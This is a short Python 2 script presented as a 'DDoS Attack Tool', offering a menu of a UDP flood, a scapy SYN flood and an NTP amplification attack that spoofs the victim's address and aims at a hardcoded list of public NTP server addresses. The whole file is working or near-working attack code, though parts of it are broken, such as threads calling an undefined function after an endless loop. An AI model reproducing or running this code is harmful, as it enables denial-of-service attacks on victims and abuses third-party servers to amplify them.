from scapy.all import *
import time
import socket
import random
import sys
import threading
def syn():
	abc=raw_input("Enter target IP: ")
	p=int(raw_input("Enter port no.: "))
	packet = IP(dst=abc)/TCP(sport=4000,dport=p)
	for port in range(1000,10000):
		packet[TCP].sport = port
		print port
		send(packet)


def flood():
	victim=raw_input("Enter target ip: ")
	vport=int(raw_input("Enter port: "))
	duration=int(raw_input("Enter duration: "))
	client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	bytes = random._urandom(1024)
	timeout =  time.time() + duration
	sent = 0
	while 1:
		if time.time() > timeout:
			break
		else:
			pass
        	client.sendto(bytes, (victim, vport))
        	sent = sent + 1
        	print "Attacking %s sent packages %s at the port %s "%(sent, victim, vport)
        
def ntpamp():
	ntplist=["129.6.15.28","129.6.15.29","129.6.15.30","129.6.15.27","132.163.97.1","132.163.97.2","132.163.97.3","132.163.97.4","132.163.96.1","128.138.140.44","128.138.141.172","132.163.96.5","132.163.97.5","128.138.141.177","129.6.15.32","128.138.140.50"]
	
	data = "\x17\x00\x03\x2a" + "\x00" * 4
	
	target=raw_input("Enter target IP: ")
	client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	PORT=80
	x=0
	y=0
	while 1==1:
		ntpserver=ntplist[x]
		packet = bytes(IP(dst=ntpserver,src=target)/UDP(sport=random.randint(2000,65535),dport=54000)/Raw(load=data))
		
		if x==15:
			x=0
		x=x+1
		y=y+1
		client.sendto(packet,(ntpserver,PORT))
		if y==1000 or y==10000:
			print "Packet Sent",y
	t1=threading.Thread(target = sendpacket)
	t1.start()
	t2=threading.Thread(target = sendpacket)
	t2.start()
	


print "+--------------------------+"
print "|","DDoS Attack Tool","        |"
print "+--------------------------+"
print "|","1 for UDP Flood","         |"
print "|","2 for Syn Flood","         |"
print "|","3 for NTP Amplification"," |"
print "+--------------------------+"
k=raw_input("Enter choice: ")
if k=="1":
    flood()
elif k=="2":
    syn()
elif k=="3":
	ntpamp()


